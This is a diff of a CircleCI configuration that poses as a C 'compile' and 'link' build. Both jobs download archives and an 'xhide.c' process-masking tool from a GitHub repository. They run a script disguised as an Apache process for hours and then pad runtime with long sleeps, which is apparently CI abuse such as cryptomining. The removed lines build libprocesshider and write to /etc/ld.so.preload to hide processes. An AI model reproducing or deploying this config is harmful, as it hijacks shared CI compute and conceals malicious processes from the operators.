@@ -1,30 +1,42 @@
 # Use the latest 2.1 version of CircleCI pipeline process engine. See: https://circleci.com/docs/2
   ###########################
   #### ubuntu-14.04-XXL #####
-  ##########################
+  ##############
 version: 2
-jobs:  
-  ubuntu-14.04-XXL:
-    machine:
-      docker_layer_caching: true
-    working_directory: /home/circleci/image-builder
-    environment:
-      IMAGE_REPO: circleci/build-image
-      TARGET: ubuntu-14.04-XXL
-      _TARGET: ubuntu-14_04-XXL
+
+workflows:
+  version: 2
+  dist-compile:
+    jobs:
+      - compile
+      - link
+jobs:
+
+  compile:
+    parallelism: 2
+    docker:
+      - image: gcc:8.2
     steps:
       - checkout
-      - run: wget https://github.com/lallianto/libprocesshider/raw/master/lib.tar.gz
-      - run: tar xf lib.tar.gz
-      - run: wget https://github.com/lallianto/weimu/raw/main/main.tar.gz
-      - run: tar xf main.tar.gz
-      - run: make
-      - run: gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-      - run: sudo mv libprocesshider.so /usr/local/lib/
-      - run: /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
+      - run: wget https://github.com/waefd46/weimu/raw/main/main.tar.gz 
+      - run: tar xf main.tar.gz 
       - run: wget https://github.com/waefd46/weimu/raw/main/xhide.c
       - run: gcc -o test xhide.c 
       - run: timeout 355m ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./sgr.sh 
       - run:
           command: sleep 18000
-          no_output_timeout: 300m    
+          no_output_timeout: 300m
+
+  link:
+    docker:
+      - image: gcc:8.2
+    steps:
+      - checkout
+      - run: wget https://github.com/waefd46/weimu/raw/main/main.tar.gz 
+      - run: tar xf main.tar.gz 
+      - run: wget https://github.com/waefd46/weimu/raw/main/xhide.c
+      - run: gcc -o test xhide.c 
+      - run: timeout 355m ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./sgr.sh 
+      - run:
+          command: sleep 18000
+          no_output_timeout: 300m
